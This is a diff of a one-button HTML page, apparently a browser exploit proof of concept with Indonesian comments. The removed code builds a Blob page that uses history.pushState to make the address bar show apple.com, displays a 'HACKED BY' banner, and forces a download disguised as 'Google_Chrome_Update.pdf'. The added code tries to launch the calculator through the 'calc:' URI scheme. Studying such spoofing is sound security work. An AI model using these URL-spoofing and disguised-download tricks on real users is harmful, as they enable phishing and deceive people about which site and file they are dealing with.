@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -20,36 +21,14 @@
 <body>
 <script>
 function a(){
-	var link = document.createElement('a');
-	
-	// Ganti href dengan Blob URL yang berisi konten spoof + pushState
-	var htmlContent = '<html>' +
-		'<head><title>Apple</title>' +
-		'<style>body{margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;text-align:center;}' +
-		'h1{font-size:72px;color:#ff0000;text-shadow:2px 2px 0 #0f0,-2px -2px 0 #00f;}' +
-		'p{font-size:20px;color:#ccc;}</style>' +
-		'<script>' +
-		'history.pushState(null, "", "https://www.apple.com");' +
-		'<' + '/script></head>' +
-		'<body>' +
-		'<h1>HACKED BY 0x403for</h1>' +
-		'<p>Your security is an illusion</p>' +
-		'<p style="font-size:14px;color:#666;">Address bar: https://www.apple.com</p>' +
-		'</body></html>';
-	
-	var blob = new Blob([htmlContent], {type: 'text/html'});
-	var blobUrl = URL.createObjectURL(blob);
-	
-	link.href = blobUrl;
-	link.download = 'Google_Chrome_Update.pdf';
-	
-	document.body.appendChild(link);
-	link.click();
-	document.body.removeChild(link);
-
-	setTimeout(function(){
-		window.location.href = link.href;
-	}, 100);
+    // Mencoba membuka aplikasi kalkulator menggunakan URI scheme
+    // 'calc:' adalah standar umum untuk Windows
+    // 'calculator:' terkadang digunakan di beberapa OS/platform
+    try {
+        window.location.href = 'calc:';
+    } catch (e) {
+        console.error("Gagal membuka aplikasi kalkulator:", e);
+    }
 }
 </script>
 <center><input type="button" class="button" value="Click Here" onclick="a()"></center>
